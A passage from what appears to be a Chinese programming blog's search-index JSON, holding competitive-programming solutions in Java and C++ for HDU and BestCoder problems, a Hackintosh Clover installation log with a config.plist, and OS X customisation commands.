rt.data; } } public class Main { public static void main(String[] args) throws IOException { StreamTokenizer in = new StreamTokenizer(new BufferedReader( new InputStreamReader(System.in))); PrintWriter out = new PrintWriter(new OutputStreamWriter(System.out)); int cas = 0; in.nextToken(); int T = (int) in.nval; while (T– &gt; 0) { Trie tr = new Trie(); in.nextToken(); int n = (int) in.nval; in.nextToken(); int m = (int) in.nval; for (int i = 1; i &lt;= n; i++) { in.nextToken(); tr.insert((long) in.nval); } out.println(&quot;Case #&quot; + (++cas) + &quot;:&quot;); for (int i = 1; i &lt;= m; i++) { in.nextToken(); out.println(tr.query((long) in.nval)); } } out.flush(); out.close(); } }[/code]","link":"/posts/c79f0e32/"},{"title":"hdu 4810 Wall Painting 位操作","text":"本题题意甚是费解。找到合适的位操作，再运用组合数，是关键。 [code lang=”java”]/** 2015年7月15日 上午11:21:15 PrjName:hdu4825 @ Semprathlon*/ import java.io.*; class Trie { private final int maxd = 33; private long data; private Trie ch0, ch1; void insert(long n) { Trie rt = this; for (int i = maxd - 1; i &amp;gt;= 0; i--) { if ((n &amp;amp; (1L &amp;lt;&amp;lt; i)) == 0L) {// 0 if (rt.ch0 == null) rt.ch0 = new Trie(); rt = rt.ch0; } else {// 1 if (rt.ch1 == null) rt.ch1 = new Trie(); rt = rt.ch1; } if (i == 0) rt.data = n; } } long query(long n) { Trie rt = this; for (int i = maxd - 1; i &amp;gt;= 0; i--) { if ((n &amp;amp; (1L &amp;lt;&amp;lt; i)) &amp;gt; 0L &amp;amp;&amp;amp; rt.ch0 != null || rt.ch1 == null)// 0 rt = rt.ch0; else if (rt.ch1 != null)// 1 rt = rt.ch1; } return rt.data; } } public class Main { public static void main(String[] args) throws IOException { StreamTokenizer in = new StreamTokenizer(new BufferedReader( new InputStreamReader(System.in))); PrintWriter out = new PrintWriter(new OutputStreamWriter(System.out)); int cas = 0; in.nextToken(); int T = (int) in.nval; while (T– &gt; 0) { Trie tr = new Trie(); in.nextToken(); int n = (int) in.nval; in.nextToken(); int m = (int) in.nval; for (int i = 1; i &lt;= n; i++) { in.nextToken(); tr.insert((long) in.nval); } out.println(&quot;Case #&quot; + (++cas) + &quot;:&quot;); for (int i = 1; i &lt;= m; i++) { in.nextToken(); out.println(tr.query((long) in.nval)); } } out.flush(); out.close(); } }[/code]","link":"/posts/4832a320/"},{"title":"我的动态","text":"","link":"/posts/9a2b4997/"},{"title":"ACM-ICPC 2014 Beijing Regional &#x2F; hdu 5115 区间DP","text":"贪心？走进死胡同了吧 [code lang=”java”]/** 2015年7月18日 上午9:55:52 PrjName:hdu5115 @ Semprathlon/import java.io.;public class Main { final static long inf=0x7FFFFFFFFFFFFFFFL; static long min(long a,long b){return Math.min(a, b); } public static void main(String[] args) throws IOException{// TODO Auto-generated method stub StreamTokenizer in=new StreamTokenizer(new BufferedReader(new InputStreamReader(System.in))); PrintWriter out=new PrintWriter(new OutputStreamWriter(System.out)); in.nextToken(); int T=(int)in.nval,cas=0; int[] a,b; long[][] f; while(T--&amp;gt;0){ in.nextToken(); int n=(int)in.nval; a=new int[n+2]; b=new int[n+2]; f=new long[n+2][n+2]; for(int i=1;i&amp;lt;=n;i++){ in.nextToken(); a[i]=(int)in.nval; } for(int i=1;i&amp;lt;=n;i++){ in.nextToken(); b[i]=(int)in.nval; } f[1][1]=a[1]+b[2]; f[n][n]=a[n]+b[n-1]; for(int i=2;i&amp;lt;n;i++) f[i][i]=a[i]+b[i-1]+b[i+1]; for(int i=1;i&amp;lt;=n;i++) for(int j=i+1;j&amp;lt;=n;j++) f[i][j]=inf; for(int j=0;j&amp;lt;=n;j++) for(int i=1;i+j&amp;lt;n+1;i++) for(int k=i;k&amp;lt;=i+j;k++){ f[i][i+j]=min(f[i][i+j],f[i][k-1]+f[k+1][i+j]+a[k]+b[i-1]+b[i+j+1]); //out.print(f[i][i+j]+&amp;quot; &amp;quot;); } /*for(int i=0;i&amp;lt;=n+1;i++){out.println(); for(int j=0;j&amp;lt;=n+1;j++) out.print(f[i][j]+&amp;quot;\\t&amp;quot;); }*/ /*for(int i=0;i&amp;lt;n;i++) for(int j=1;j&amp;lt;n-i;j++){ if (j==1) min(f[j][j+i],f[j+1][j+i]+a[j]); if (j&amp;gt;1) min(f[j][j+i],f[j+1][j+i]+a[j]+b[j-1]); if (i+j&amp;lt;n) min(f[j][j+i],f[j][j+i-1]+a[j+i]+b[j+i+1]); if (i+j==n) min(f[j][j+i],f[j][j+i-1]+a[j+i]); for(int k=j+1;k&amp;lt;j+i;k++) min(f[j][j+i],f[j][k-1]+a[k]+f[k+1][j+i]); }*/ out.println(&amp;quot;Case #&amp;quot;+(++cas)+&amp;quot;: &amp;quot;+f[1][n]); out.flush(); } out.close(); } }[/code]","link":"/posts/fb58aa85/"},{"title":"分享一只仓鼠君","text":"","link":"/posts/1bdb74a9/"},{"title":"Solving LCM【C0n,C1n,   ,Cnn】","text":"摘自《具体数学·计算机科学基础（英文版·第二版）》第5章习题及其解答： $latex \\epsilon_p(n)$denotes the exponent of the prime p in the standard factorization of positive integer n. $latex \\epsilon_p(n)$表示正整数n的因式分解中，质数p的指数。","link":"/posts/2ad552c7/"},{"title":"暑假翻江倒海折腾Clover+Mac险遭失败","text":"重大突破！基本硬件信息[code] 主板: 处理器名称 Mobile DualCore Intel Core i5-2450M, 2900 MHz (29 x 100) 主板名称 Hewlett-Packard HP ProBook 4431s 主板芯片组 Intel Cougar Point HM65, Intel Sandy Bridge 系统内存 8119 MB (DDR3-1600 DDR3 SDRAM) BIOS 类型 Compaq (05/23/2012) 显示设备: 显示适配器 Intel(R) HD Graphics 3000 (2108 MB) 3D 加速器 AMD Radeon HD 6490M (Seymour) 3D 加速器 Intel HD Graphics 3000 多媒体: 音频适配器 IDT 92HD87B1/3 @ Intel Cougar Point PCH - High Definition Audio Controller [B-2] 音频适配器 Intel Cougar Point HDMI @ Intel Cougar Point PCH - High Definition Audio Controller [B-2] 存储设备: 硬盘驱动器 TOSHIBA MQ01ABD050 SCSI Disk Device (500 GB, 5400 RPM, SATA-II) 光盘驱动器 hp DVDRAM GT50N SCSI CdRom Device (DVD+R9:6x, DVD-R9:6x, DVD+RW:8x/8x, DVD-RW:8x/6x, DVD-RAM:5x, DVD-ROM:8x, CD:24x/24x/24x DVD+RW/DVD-RW/DVD-RAM) 输入设备: 键盘 PS/2 标准键盘 鼠标 HID-compliant mouse 鼠标 Logitech HID-compliant Unifying Mouse 鼠标 PS/2 兼容鼠标 网络设备: 网络适配器 Microsoft Virtual WiFi Miniport Adapter #2 网络适配器 Qualcomm Atheros AR9285 802.11b/g/n WiFi Adapter 网络适配器 Realtek PCIe GBE Family Controller 外围设备: USB2 控制器 Intel Cougar Point PCH - USB EHCI #1 Controller [B-2] USB2 控制器 Intel Cougar Point PCH - USB EHCI #2 Controller [B-2] USB3 控制器 NEC uPD720200AF1 USB 3.0 Host Controller USB 设备 2.4G Wireless headset USB 设备 Generic Bluetooth Adapter USB 设备 HP HD Webcam [Fixed] USB 设备 Logitech Unifying USB receiver USB 设备 USB Composite Device USB 设备 USB Input Device (Logitech Download Assistant) USB 设备 USB 大容量存储设备 USB 设备 Validity Sensor USB 设备 Wacom Tablet 电池 Microsoft AC Adapter 电池 Microsoft ACPI-Compliant Control Method Battery [/code] Stage 1在大量繁复的尝试中偶然发现，此前的系统引导失败与所使用的Clover版本有关。现用的经尝试可成功引导的为Clover_v2k_r2482。部署至EFI分区的EFI/Clover目录下，用CloverX64.efi替换EFI/Boot/下的bootx64.efi，将原有的EFI/Microsoft文件夹移至C:/Boot/下(注意备份原始文件)，避免系统启动时默认进入win系统。记得删掉EFI/Clover/drivers64UEFI下csm开头的efi文件（支持CSM的显卡驱动文件），修复进入Clover是屏幕亮但无显示的故障。 Stage 2根据热门教程，将pcbeta提供的OS X Mavericks 10.9.5懒人版镜像写入hfs+分区。但是引导进入安装分区时，菊花会无故停转，随后重启。开启了啰嗦模式再观察报错情况。查阅PCBETA相关教程得知，不仅需要fakesmc.kext，更需要NullCPUPowerManagement.kext禁用（部分？）电源管理，以解决这个似是而非的蓝牙驱动报错。附加的kext放在fakesmc的plugin目录下。成功进入安装程序。 Stage 3完成初始设定后进入系统。在PCBETA上获取了以下kext以驱动相关硬件（极为困惑的是，不同的kext，放在合适的目录下方可生效）： kext 硬件 存放目录 IO80211Family.kext Qualcomm Atheros AR9285 802.11b/g/n WiFi Adapter S/L/E IOath3kfrmwr.kext Qualcomm Atheros AR3011 Bluetooth 3.0 Adapter S/L/E IOBluetoothFamily.kext Qualcomm Atheros AR3011 Bluetooth 3.0 Adapter S/L/E ACPIBatteryManager.kext Battery PR06047 fakesmc.kext/Plugin GenericUSBXHCI.kext NEC uPD720200AF1 USB 3.0 Host Controller fakesmc.kext/Plugin AppleACPIPS2Nub.kext ? fakesmc.kext/Plugin ApplePS2Controller.kext ? fakesmc.kext/Plugin ApplePS2Keyboard.kext 101/102-Key or MS Natural Keyboard fakesmc.kext/Plugin ApplePS2Mouse.kext Synaptics PS/2 Port TouchPad fakesmc.kext/Plugin RealtekRTL8111.kext Realtek RTL8168/8111 PCI-E Gigabit Ethernet Adapter fakesmc.kext/Plugin AppleIntelSNBGraphicsFB.kext Intel HD Graphics 3000 &amp; Intel Cougar Point HDMI S/L/E AppleHDA.kext IDT 92HD87B1/3 @ Intel Cougar Point PCH S/L/E Stage 4更新了Clover的config.plist以指定开机默认启动系统，增强硬件性能。[code lang=”xml”]&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&gt;&lt;plist version=&quot;1.0&quot;&gt;&lt;dict&gt; &lt;key&gt;ACPI&lt;/key&gt; &lt;dict&gt; &lt;key&gt;DSDT&lt;/key&gt; &lt;dict&gt; &lt;key&gt;Debug&lt;/key&gt; &lt;false/&gt; &lt;key&gt;DropOEM_DSM&lt;/key&gt; &lt;false/&gt; &lt;key&gt;ReuseFFFF&lt;/key&gt; &lt;false/&gt; &lt;/dict&gt; &lt;key&gt;SSDT&lt;/key&gt; &lt;dict&gt; &lt;key&gt;DropOem&lt;/key&gt; &lt;true/&gt; &lt;key&gt;EnableC2&lt;/key&gt; &lt;true/&gt; &lt;key&gt;EnableC4&lt;/key&gt; &lt;true/&gt; &lt;key&gt;EnableC6&lt;/key&gt; &lt;true/&gt; &lt;key&gt;Generate&lt;/key&gt; &lt;true/&gt; &lt;/dict&gt; &lt;/dict&gt; &lt;key&gt;Boot&lt;/key&gt; &lt;dict&gt; &lt;key&gt;Debug&lt;/key&gt; &lt;false/&gt; &lt;key&gt;DefaultVolume&lt;/key&gt; &lt;string&gt;OS X 10.9.5&lt;/string&gt; &lt;key&gt;Legacy&lt;/key&gt; &lt;string&gt;PBR&lt;/string&gt; &lt;key&gt;Secure&lt;/key&gt; &lt;false/&gt; &lt;key&gt;Timeout&lt;/key&gt; &lt;integer&gt;3&lt;/integer&gt; &lt;key&gt;XMPDetection&lt;/key&gt; &lt;false/&gt; &lt;/dict&gt; &lt;key&gt;Devices&lt;/key&gt; &lt;dict&gt; &lt;key&gt;Audio&lt;/key&gt; &lt;dict&gt; &lt;key&gt;Inject&lt;/key&gt; &lt;string&gt;Detect&lt;/string&gt; &lt;/dict&gt; &lt;key&gt;FakeID&lt;/key&gt; &lt;dict&gt; &lt;key&gt;IntelGFX&lt;/key&gt; &lt;string&gt;0x01268086&lt;/string&gt; &lt;/dict&gt; &lt;key&gt;USB&lt;/key&gt; &lt;dict&gt; &lt;key&gt;AddClockID&lt;/key&gt; &lt;true/&gt; &lt;key&gt;FixOwnership&lt;/key&gt; &lt;true/&gt; &lt;key&gt;Inject&lt;/key&gt; &lt;true/&gt; &lt;/dict&gt; &lt;key&gt;UseIntelHDMI&lt;/key&gt; &lt;true/&gt; &lt;/dict&gt; &lt;key&gt;DisableDrivers&lt;/key&gt; &lt;array&gt; &lt;string&gt;Nothing&lt;/string&gt; &lt;/array&gt; &lt;key&gt;GUI&lt;/key&gt; &lt;dict&gt; &lt;key&gt;Hide&lt;/key&gt; &lt;array&gt; &lt;string&gt;\\EFI\\BOOT\\BOOTX64.EFI&lt;/string&gt; &lt;string&gt;Windows&lt;/string&gt; &lt;/array&gt; &lt;key&gt;Language&lt;/key&gt; &lt;string&gt;en:0&lt;/string&gt; &lt;key&gt;Mouse&lt;/key&gt; &lt;dict&gt; &lt;key&gt;DoubleClick&lt;/key&gt; &lt;integer&gt;500&lt;/integer&gt; &lt;key&gt;Enabled&lt;/key&gt; &lt;false/&gt; &lt;key&gt;Mirror&lt;/key&gt; &lt;false/&gt; &lt;key&gt;Speed&lt;/key&gt; &lt;integer&gt;0&lt;/integer&gt; &lt;/dict&gt; &lt;key&gt;Scan&lt;/key&gt; &lt;dict&gt; &lt;key&gt;Entries&lt;/key&gt; &lt;true/&gt; &lt;key&gt;Legacy&lt;/key&gt; &lt;true/&gt; &lt;key&gt;Tool&lt;/key&gt; &lt;true/&gt; &lt;/dict&gt; &lt;key&gt;Theme&lt;/key&gt; &lt;string&gt;Universe&lt;/string&gt; &lt;/dict&gt; &lt;key&gt;Graphics&lt;/key&gt; &lt;dict&gt; &lt;key&gt;Inject&lt;/key&gt; &lt;dict&gt; &lt;key&gt;ATI&lt;/key&gt; &lt;false/&gt; &lt;key&gt;Intel&lt;/key&gt; &lt;false/&gt; &lt;key&gt;NVidia&lt;/key&gt; &lt;false/&gt; &lt;/dict&gt; &lt;key&gt;NvidiaSingle&lt;/key&gt; &lt;false/&gt; &lt;/dict&gt; &lt;key&gt;KernelAndKextPatches&lt;/key&gt; &lt;dict&gt; &lt;key&gt;AppleRTC&lt;/key&gt; &lt;true/&gt; &lt;key&gt;AsusAICPUPM&lt;/key&gt; &lt;true/&gt; &lt;key&gt;Debug&lt;/key&gt; &lt;false/&gt; &lt;key&gt;KernelCpu&lt;/key&gt; &lt;false/&gt; &lt;key&gt;KernelHaswellE&lt;/key&gt; &lt;false/&gt; &lt;key&gt;KernelLapic&lt;/key&gt; &lt;false/&gt; &lt;key&gt;KernelPm&lt;/key&gt; &lt;false/&gt; &lt;key&gt;KextsToPatch&lt;/key&gt; &lt;array&gt; &lt;dict&gt; &lt;key&gt;Comment&lt;/key&gt; &lt;string&gt;External icons patch&lt;/string&gt; &lt;key&gt;Find&lt;/key&gt; &lt;data&gt; RXh0ZXJuYWw= &lt;/data&gt; &lt;key&gt;Name&lt;/key&gt; &lt;string&gt;AppleAHCIPort&lt;/string&gt; &lt;key&gt;Replace&lt;/key&gt; &lt;data&gt; SW50ZXJuYWw= &lt;/data&gt; &lt;/dict&gt; &lt;/array&gt; &lt;/dict&gt; &lt;key&gt;SystemParameters&lt;/key&gt; &lt;dict&gt; &lt;key&gt;InjectKexts&lt;/key&gt; &lt;string&gt;Detect&lt;/string&gt; &lt;key&gt;InjectSystemID&lt;/key&gt; &lt;true/&gt; &lt;/dict&gt;&lt;/dict&gt;&lt;/plist&gt;[/code] Stage 5启用DSDT补丁，以便实现深层次的硬件兼容。在不存在DSDT patch的条件下，于Clover中按F4键，快速获得BIOS中的DSDT、SSDT于目录EFI/Clover/ACPI/origin。初次打补丁时，发现有些修正并未完全生效。认真研读PCBETA相关教程，更正了打补丁的方式。将SSDT-0.aml更名为SSDT.aml，去掉其余aml文件末尾的x。在Mac中获取命令行版的iasl，在终端下对DSDT.aml、SSDT-.aml进行反编译得到.dsl。使用maciasl，添加External(…)等行，排除了编译错误。引用Rehebman的补丁源，针对显卡、屏幕亮度等应用了补丁。修改完后，再在终端下将.dsl编译为.aml，放到EFI/Clover/ACPI/patched。【未完待续","link":"/posts/ef2844be/"},{"title":"OS X下的一些个性化设置","text":"修改截图保存位置 defaults write com.apple.screencapture location /path/ killall SystemUIServer Finder显示隐藏文件 defaults write com.apple.finder AppleShowAllFiles -bool true Finder显示全部驱动器 Dashboard不显示为单独页面 调整屏幕亮度等常用功能快捷键 允许未知来源Application的运行 管理开机启动项","link":"/posts/8a603219/"},{"title":"BestCoder","text":"1001 Victor and MachineTime Limit: 2000/1000 MS (Java/Others) Memory Limit: 131072/65536 K (Java/Others) Problem DescriptionVictor has a machine. When the machine starts up, it will pop out a ball immediately. After that, the machine will pop out a ball every w seconds. However, the machine has some flaws, every time after x seconds of process the machine has to turn off for y seconds for maintenance work. At the second the machine will be shut down, it may pop out a ball. And while it’s off, the machine will pop out no ball before the machine restart.Now, at the 0 second, the machine opens for the first time. Victor wants to know when the n-th ball will be popped out. Could you tell him? InputThe input contains several test cases, at most 100 cases.Each line has four integers x, y, w and n. Their meanings are shown above。$latex 1\\leq x,y,w,n\\leq 100 $ . OutputFor each test case, you should output a line contains a number indicates the time when the n-th ball will be popped out. Sample Input2 3 3 398 76 54 3210 9 8 100 Sample Output102664939 n-1的问题，自己刚开始出了点差错：[code lang=”java”]/** Aug 22, 2015 7:03:37 PM PrjName:Bc52-01 @author Semprathlon/import java.io.;import java.util.*;public class Main { /** @param args*/public static void main(String[] args) throws IOException{ // TODO Auto-generated method stub StreamTokenizer in=new StreamTokenizer(new BufferedInputStream(System.in)); PrintWriter out=new PrintWriter(System.out); while(in.nextToken()!=StreamTokenizer.TT_EOF){int x=(int)in.nval; in.nextToken(); int y=(int)in.nval; in.nextToken(); int w=(int)in.nval; in.nextToken(); int n=(int)in.nval; if (n==1){ out.println(0);continue; } if (w&amp;gt;x){ out.println((n-1)*(x+y));continue; } else if (w==x){ out.println((n-1)/2*(x+y)+(n-1)%2*x);continue; } else{ int tmp=(x+w)/w; out.println((n-1)/tmp*(x+y)+(n-1)%tmp*w);continue; } } out.flush(); out.close();} }[/code]","link":"/posts/561c3d53/"},{"title":"BestCoder 1st Anniversary T_T","text":"1001 SouvenirTime Limit: 2000/1000 MS (Java/Others) Memory Limit: 262144/262144 K (Java/Others)[code lang=”java”]/** 2015年7月25日 下午7:07:41 PrjName:0725-01 @ Semprathlon*/public class Main { public static void main(String[] args) { // TODO Auto-generated method stub InputReader in=new InputReader(System.in); PrintWriter out=new PrintWriter(System.out); int T=in.nextInt(); while(T--&amp;gt;0){ int n=in.nextInt(); int m=in.nextInt(); int p=in.nextInt(); int q=in.nextInt(); int ans=0,has=0; if (m*p&amp;gt;q) ans+=n/m*q; else ans+=n/m*m*p; ans+=n%m*p; if ((n+m)/m*q&amp;lt;ans) ans=(n+m)/m*q; out.println(ans); } out.flush(); out.close(); } }[/code] 1002 Hidden StringTime Limit: 2000/1000 MS (Java/Others) Memory Limit: 262144/262144 K (Java/Others)用Trie做查询时，往死胡同里钻而且根本停不下来，啊啊啊啊……[code lang=”cpp”] #include &lt;cstdio&gt; #include &lt;cstring&gt;char s[200], con[] = &quot;anniversary&quot;; int main(){ int T; scanf(&quot;%d&quot;, &amp;T); while(T–) { scanf(&quot;%s&quot;, s); int len = strlen(s); bool flag = false; for(int i = 0; i &lt;= 8; i++) { for(int j = i + 1; j &lt;= 9; j++) { int k = 0; while(k &lt; len &amp;&amp; strncmp(con, s + k, i + 1) != 0) k ++; if(k == len) continue; k += i + 1; while(k &lt; len &amp;&amp; strncmp(con + i + 1, s + k, j - i) != 0) k ++; if(k == len) continue; k += j - i; while(k &lt; len &amp;&amp; strncmp(con + j + 1, s + k, 10 - j) != 0) k ++; if(k != len) { flag = true; break; } } } if(flag) puts(&quot;YES&quot;); else puts(&quot;NO&quot;); }}[/code]这里的枚举倒是简洁得出奇。 1003 SequenceTime Limit: 2000/2000 MS (Java/Others) Memory Limit: 262144/262144 K (Java/Others)下意识地做了贪心，果然被hack","link":"/posts/de536c8e/"},{"title":"Bestcoder","text":"1001 UntitledTime Limit: 2000/1000 MS (Java/Others) Memory Limit: 65536/65536 K (Java/Others)[code lang=”java”]/** 2015年8月1日 下午7:15:14 PrjName:Bc49-01 @ Semprathlon/import java.io.;import java.util.*;public class Main { static ArrayList&lt;Integer&gt; v=new ArrayList&lt;Integer&gt;(); static int[] a,f; static int lowbit(int x){return x&amp;amp;(-x); } static int get(int x){int res=0; while(x&amp;gt;0){ res++; x-=lowbit(x); } return res; } public static void main(String[] args) throws IOException{// TODO Auto-generated method stub InputReader in=new InputReader(System.in); PrintWriter out=new PrintWriter(System.out); int T=in.nextInt(); while(T--&amp;gt;0){ v.clear(); int n=in.nextInt(); int m=in.nextInt(); for(int i=1;i&amp;lt;=n;i++) v.add(in.nextInt()); Collections.sort(v); f=new int[1&amp;lt;&amp;lt;n]; Arrays.fill(f, -1); f[0]=m; //out.println(n); int ans=Integer.MAX_VALUE; for(int i=0;i&amp;lt;(1&amp;lt;&amp;lt;n);i++) if (f[i]&amp;gt;0) for(int j=0;j&amp;lt;n;j++) if (((1&amp;lt;&amp;lt;j)&amp;amp;i)==0){ int k=i|(1&amp;lt;&amp;lt;j); f[k]=f[i]%v.get(j); if (f[k]==0) ans=Math.min(ans, get(k)); } if (ans==Integer.MAX_VALUE) out.println(-1); else out.println(ans); } out.flush(); out.close(); }}[/code] 1002 Three PalindromesTime Limit: 2000/1000 MS (Java/Others) Memory Limit: 65536/65536 K (Java/Others) Problem DescriptionCan we divided a given string S into three nonempty palindromes? InputFirst line contains a single integer $latex T \\leq 20 $ which denotes the number of test cases.For each test case , there is an single line contains a string S which only consist of lowercase English letters.$latex 1\\leq |s| \\leq 20000 $ OutputFor each case, output the “Yes” or “No” in a single line. Sample Input2abcabaadada Sample OutputYesNo 赛时的Hash做法：[code lang=”java”]/** 2015年8月1日 下午7:47:15 PrjName:Bc49-02 @ Semprathlon/import java.io.;import java.util.*;public class Main { static long pri=29L; static long lh(String s,long res,int p){ return res*pri+(long)(s.charAt(p)-&apos;a&apos;); } static long rh(String s,long res,int p,long m){ return res+(long)(s.charAt(p)-&apos;a&apos;)*m; } static BitSet v=new BitSet(20010); public static void main(String[] args) throws IOException{ // TODO Auto-generated method stub InputReader in=new InputReader(System.in); PrintWriter out=new PrintWriter(System.out); int T=in.nextInt(); while(T--&amp;gt;0){ String s=new String(in.next()); int len=s.length(); //s=s+&amp;quot;#&amp;quot;+(new StringBuffer(s).reverse().toString()); //out.println(s); boolean ans=false; long l1=0L,r1=0L,tmp=1L; for(int i=0;i&amp;lt;len;i++){ if (ans) break; l1=lh(s, l1, i); r1=rh(s, r1, i, tmp); //out.println(i+&amp;quot; &amp;quot;+l1+&amp;quot; &amp;quot;+r1); tmp*=pri; //if ((i&amp;amp;1)&amp;gt;0) continue; if (l1==r1){ //out.println(&amp;quot;f&amp;quot;+i); long l2=0L,r2=0L,tmp2=1L; v.clear(); for(int j=i+1;j&amp;lt;len;j++){ l2=lh(s,l2,j); r2=rh(s,r2,j,tmp2); tmp2*=pri; //if (((j-i+1)&amp;amp;1)&amp;gt;0) continue; if (l2==r2) v.set(j); } l2=0L;r2=0L;tmp2=1L; for(int j=len-1;j&amp;gt;i;j--){ l2=lh(s,l2,j); r2=rh(s,r2,j,tmp2); tmp2*=pri; //if (((len-j+1)&amp;amp;1)&amp;gt;0) continue; if (l2==r2&amp;amp;&amp;amp;v.get(j-1)){ ans=true;break; } } } } out.println(ans?&amp;quot;Yes&amp;quot;:&amp;quot;No&amp;quot;); } out.flush(); out.close(); }}[/code]首次尝试去hack别人不成，还被人黑了，立马TLE 题解介绍的多种方法中，个人认为二分+hash代码量较少，如何实现？","link":"/posts/97dd1257/"},{"title":"BestCoder","text":"1001 Distribution moneyWA过一发，因为忽视了金额的分布范围。[code lang=”java”]/** 2015年8月8日 下午7:02:20 PrjName:Bc50-01 @ Semprathlon/import java.io.;import java.util.*;public class Main { static int[] a; static int maxn=10001; public static void main(String[] args) throws IOException{// TODO Auto-generated method stub StreamTokenizer in=new StreamTokenizer(new BufferedInputStream(System.in)); PrintWriter out=new PrintWriter(System.out); a=new int[maxn]; while(in.nextToken()!=StreamTokenizer.TT_EOF){ int n=(int)in.nval; Arrays.fill(a, 0); for(int i=1;i&amp;lt;=n;i++){ in.nextToken(); int k=(int)in.nval; a[k]++; } int ans=-1; for(int i=0;i&amp;lt;maxn;i++) if ((a[i]&amp;lt;&amp;lt;1)&amp;gt;n) ans=i; //if (n&amp;gt;1) out.println(ans); //else //out.println(-1); } out.flush(); out.close(); }}[/code] 1002 Run明显搞复杂了，做了一回出题人眼中的“火星人”T_T平面上的整点就是无法构成正三角形、正五边形、正六边形，没这点见识就只有瞎弄。。。简化到这个地步，正方形的判断就应该仔细点了吧？四条边及两对角线的长度比较都写上，[code lang=”java”]/** Nov 19, 2015 7:32:18 PM PrjName: hdu5365 @semprathlon/import java.io.;import java.util.*;public class Main { static Point[] pt; static boolean check(Point p1,Point p2,Point p3,Point p4){double[] v=new double[6]; v[0]=Point.dist(p1, p2); v[1]=Point.dist(p2, p3); v[2]=Point.dist(p3, p4); v[3]=Point.dist(p1, p4); v[4]=Point.dist(p1, p3); v[5]=Point.dist(p2, p4); Arrays.sort(v); return v[0]==v[1]&amp;amp;&amp;amp;v[1]==v[2]&amp;amp;&amp;amp;v[2]==v[3]&amp;amp;&amp;amp;v[4]==v[5]; } public static void main(String[] args) throws IOException{InputReader in=new InputReader(System.in); PrintWriter out=new PrintWriter(System.out); while(in.nextLine()!=null){ int n=in.nextInt(); pt=new Point[n]; for(int i=0;i&amp;lt;n;i++) pt[i]=new Point(in.nextInt(), in.nextInt()); int ans=0; for(int i=0;i&amp;lt;n;i++) for(int j=i+1;j&amp;lt;n;j++) for(int k=j+1;k&amp;lt;n;k++) for(int l=k+1;l&amp;lt;n;l++){ Point p1=pt[i],p2=pt[j],p3=pt[k],p4=pt[l]; if (check(p1, p2, p3, p4)) ans++; } out.println(ans); } out.flush(); out.close(); }}[/code] 1003 The mook jong多么有教育意义的猜公式，猜不出就别偏执了。。。f[i]=s[i-3]+1,s[i]=s[i-1]+f[i],…","link":"/posts/561c3d53/"},{"title":"hdu 4185 Oil Skimming 二分图匹配","text":"Oil Skimming[code lang=”java”]/** Aug 24, 2015 11:15:57 AM PrjName:hdu4185 @author Semprathlon/import java.io.;import java.util.*;public class Main { /** @param args/static char[][] mp;//static int[][] adj;static int[] match;static boolean[] vis;static int n,cnt,sum;final static int[][] dir={ {-1,0},{1,0},{0,-1},{0,1}};final static int maxn=605;static Vector&lt;Integer&gt;[] adj=new Vector[maxnmaxn&gt;&gt;1];static HashMap&lt;Integer, Integer&gt; sta=new HashMap&lt;Integer,Integer&gt;();static HashMap&lt;Integer, Integer&gt; stb=new HashMap&lt;Integer,Integer&gt;();static int geta(Pt p){ int hash=p.hashCode(); if (sta.containsKey(hash)) return sta.get(hash); else{ sta.put(hash, ++cnt); return cnt; }}static int getb(Pt p){ int hash=p.hashCode(); if (stb.containsKey(hash)) return stb.get(hash); else{ stb.put(hash, ++sum); return sum; }}static boolean cango(int x,int y){ if (x&lt;0||x&gt;=n||y&lt;0||y&gt;=n||mp[x][y]!=’#’) return false; return true;}static boolean dfs(int u){ for(int v:adj[u]){ if (vis[v]) continue; vis[v]=true; if (match[v]&amp;lt;0||dfs(match[v])){ match[v]=u; return true; } } return false;}static int maxmatch(){ int res=0; Arrays.fill(match, -1); for(int i=1;i&lt;=cnt;i++){ Arrays.fill(vis, false); if (dfs(i)) res++; } return res;}public static void main(String[] args) throws IOException{ // TODO Auto-generated method stub InputReader in=new InputReader(System.in); PrintWriter out=new PrintWriter(System.out); for(int i=0;i&lt;maxn*maxn&gt;&gt;1;i++) adj[i]=new Vector&lt;Integer&gt;(); int T=in.nextInt(),cas=0; while(T–&gt;0){ n=in.nextInt(); mp=new char[n][n]; for(int i=0;i&amp;lt;n*n&amp;gt;&amp;gt;1;i++) adj[i].clear(); sta.clear();stb.clear();cnt=sum=0; for(int i=0;i&amp;lt;n;i++){ String s=in.next(); for(int j=0;j&amp;lt;n;j++) mp[i][j]=s.charAt(j); } for(int i=0;i&amp;lt;n;i++) for(int j=0;j&amp;lt;n;j++) if (mp[i][j]==&apos;#&apos;){ Pt p=new Pt(i, j,n); for(int k=0;k&amp;lt;4;k++){ int x=i+dir[k][0]; int y=j+dir[k][1]; if (((x+y)&amp;amp;1)&amp;gt;0&amp;amp;&amp;amp;cango(x,y)){ Pt q=new Pt(x, y,n); adj[geta(p)].add(getb(q)); //adj[q.hashCode()].add(p); } } } match=new int[sum+1]; vis=new boolean[sum+1]; out.println(&amp;quot;Case &amp;quot;+(++cas)+&amp;quot;: &amp;quot;+maxmatch()); } out.flush(); out.close();} }class Pt{ int x,y,n; Pt(int _x,int _y,int _n){ x=_x;y=_y;n=_n; } Pt(int hash,int _n){ n=_n; y=hash%n; x=hash/n; } public int hashCode(){ return x*n+y; }}class InputReader{ public BufferedReader reader; public StringTokenizer tokenizer; public InputReader(InputStream stream){ reader = new BufferedReader(new InputStreamReader(stream), 32768); tokenizer = null; } public String next(){ while(tokenizer == null || !tokenizer.hasMoreTokens()){ try{ tokenizer = new StringTokenizer(reader.readLine()); }catch (IOException e) { throw new RuntimeException(e); } } return tokenizer.nextToken(); } public int nextInt() { return Integer.parseInt(next()); } public long nextLong() { return Long.parseLong(next()); } }[/code] 折腾了过长的时间，原因：这不是通常意义上的可随意匹配的二分图。既然是二分图，就有把节点分为两类的依据。由题中给定的结合规则，一定是一个(x+y)为偶数的点与一个(x+y)为奇数的点相匹配，且是相邻点的匹配。所以会将两类点分别加入两个表中，并进行hash操作节约存储空间。“奇”的点总是不少于“偶”的点？","link":"/posts/9d17cab3/"},{"title":"2013 ACM&#x2F;ICPC Asia Regional Chengdu Online","text":"1007 F(x)数位DP[code lang=”java”]/** Aug 22, 2015 5:23:42 PM PrjName:hdu4734 @author Semprathlon/import java.io.;import java.util.*;public class Main { /** @param args*/static int[][] f;static int[] digit;final 